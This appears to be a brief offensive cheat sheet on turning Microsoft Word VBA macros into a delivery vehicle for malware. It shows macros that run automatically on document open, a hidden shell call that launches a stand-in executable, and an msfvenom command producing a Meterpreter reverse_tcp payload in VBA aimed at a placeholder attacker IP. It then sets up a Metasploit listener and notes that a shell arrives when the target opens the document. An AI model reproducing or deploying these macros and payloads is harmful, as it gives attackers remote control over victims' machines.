# Visual Basic for Application (VBA)

Open Visual Basic Editor in MSWord by selecting view → macros Name the macro and click create.

For another message box (testing):

    Sub MACRONAME()
      MsgBox ("Message in a box")
    End Sub

Run the macro with F5.

To execute it automatically:

    Sub Document_Open()
      MACRONAME
    End Sub
    
    Sub AutoOpen()
      MACRONAME
    End Sub
    
    Sub MACRONAME()
      MsgBox ("Message in a box")
    End Sub

Save the document in docm or doc.

## Execute a bin

    Sub ExecBin()
            Dim payload As String
            payload = "calc.exe"
            CreateObject("Wscript.Shell").Run payload,0
    End Sub

## Use msfvenom for VBA

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=443 -f vba

Copy the output in the file and set the listener with msfconsole 

    use exploit/multi/handler 

Set LHOS, LPORT and payload to `windows/meterpreter/reverse_tcp`.

When the doc is open in the target machine we get a meterpreter shell.
